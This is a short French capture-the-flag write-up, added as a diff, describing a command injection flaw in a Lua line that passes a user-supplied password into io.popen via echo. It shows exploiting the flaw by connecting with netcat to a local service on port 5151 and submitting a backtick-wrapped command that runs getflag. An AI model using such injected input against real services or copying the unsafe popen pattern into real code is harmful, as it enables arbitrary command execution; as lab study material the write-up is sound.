@@ -1,0 +1,11 @@
+on peu voir que on peu se connecter avec netcat au 127.0.0.1 au port 5151
+
+
+la faille est sur cette ligne
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+on peu execute un commande grace au pass qui est la variable recupere apres le mots de passe entre
+
+on fait donc :
+nc 127.0.0.1 5151
+`getflag > /tmp/oui`
